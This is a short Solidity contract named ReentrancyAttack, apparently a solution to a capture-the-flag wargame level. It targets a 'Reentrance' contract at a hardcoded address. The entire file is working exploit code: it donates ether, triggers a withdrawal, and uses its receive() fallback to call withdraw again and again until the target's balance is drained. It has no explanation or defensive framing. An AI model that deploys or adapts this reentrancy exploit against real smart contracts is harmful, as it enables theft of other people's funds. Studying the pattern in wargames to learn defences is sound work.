// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './Reentrance.sol';

contract ReentrancyAttack {
    Reentrance public reentrance;
  
  using SafeMath for uint256;

  constructor() public {
      reentrance = Reentrance(0x03Ee25d1a81a00632757d2b8B081811ACc39ceC5);
  }

  function donate() public payable{
      reentrance.donate.value(msg.value)(address(this));
  }

  function withdraw() public payable{
      reentrance.withdraw(reentrance.balanceOf(address(this)));
  }

  receive() external payable {
      if (address(reentrance).balance > 0) {
          reentrance.withdraw(address(reentrance).balance);
      }
  }
}